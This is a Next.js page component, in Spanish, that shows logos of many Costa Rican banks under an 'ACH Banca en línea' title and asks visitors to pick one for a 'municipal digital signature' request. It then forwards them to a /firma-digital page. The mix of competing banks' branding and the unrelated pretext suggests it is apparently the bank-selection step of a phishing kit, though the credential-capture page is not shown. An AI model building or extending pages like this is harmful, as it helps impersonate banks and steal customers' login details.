import Head from "next/head";
import Router from "next/router";
function Transferencia() {
  // funtion to change the route with the state as get parameters
  const handleChange = (value) => {
    if(value === ""){
      alert("No ha ingresado un banco")
      return;
    }
    Router.push({
      pathname: "/firma-digital",
      query: { id: value },
    });
  };

  return (
    <div className="overflow-x-hidden">
      <Head>
        <title>Selección de Banco | ACH Banca en línea</title>
        <link rel="icon" href="/lafise.webp" />
      </Head>
      <div className="w-10/12 lg:w-6/12 mx-auto my-10 space-y-5">
        <img src="banner6.webp" className="w-44 mx-auto" />
       
        <div className="grid">
          <h1 className="text-2xl text-center">
            SELECCIONE SU OFICINA DE REGISTRO AUTORIZADA PARA EL PROCESO DE
            SOLICITUD DE FIRMA DIGITAL MUNICIPAL.
          </h1>
          <img
            src="/logo_banco-nacional.webp"
            className="w-80 mx-auto"
            onClick={(e) => handleChange("banco-nacional")}
          />
          <img
            src="/LOGO_BCR.svg.webp"
            className="w-80 mx-auto"
            onClick={(e) => handleChange("BCR")}
          />
          <img
            src="/logo_bacredomatic.webp"
            className="w-80 mx-auto"
            onClick={(e) => handleChange("bacredomatic")}
          />
          <img
            src="/logo_bancopopular.webp"
            className="w-80 mx-auto"
            onClick={(e) => handleChange("banco-popular")}
          />
          <img
            src="/descarga.webp"
            className="w-80 mx-auto"
            onClick={(e) => handleChange("banco-proamerica")}
          />
          <img
            src="/Logo_Banco_LAFISEULTIMO2.webp"
            className="w-80 mx-auto"
            onClick={(e) => handleChange("lafise")}
          />
          <img
            src="/descarga (1).webp"
            className="w-80 mx-auto"
            onClick={(e) => handleChange("Coope-ande")}
          />
          <img
            src="/descarga (3).webp"
            className="w-80 mx-auto"
            onClick={(e) => handleChange("mucap")}
          />
          <img
            src="/descarga (2)-2.webp"
            className="w-80 mx-auto"
            onClick={(e) => handleChange("grupo-mutual")}
          />
 <img
            src="/davivienda.jpg"
            className="w-80 mx-auto"
            onClick={(e) => handleChange("davivienda")}
          />
           <img
            src="/cathay.jpg"
            className="w-80 mx-auto"
            onClick={(e) => handleChange("cathay")}
          />
            <img
            src="/btc.jpg"
            className="w-80 mx-auto"
            onClick={(e) => handleChange("btc")}
          />
           <img
            src="/scotiabank.jpg"
            className="w-80 mx-auto"
            onClick={(e) => handleChange("scotiabank")}
          />
          <div>
            <label>Otro banco:</label>
            <input type="text" id="otro-banco" className="w-full p-2 border rounded" />
            <button
              onClick={(e) => handleChange(document.getElementById("otro-banco").value)}
              className="my-3 w-full bg-blue-500 text-white p-2 rounded"
            >
              Confirmar
            </button>
          </div>

          <img src="banner5.webp" className="w-44 mx-auto my-10" />
        </div>
      </div>
    </div>
  );
}

Transferencia.layout = "L2";

export default Transferencia;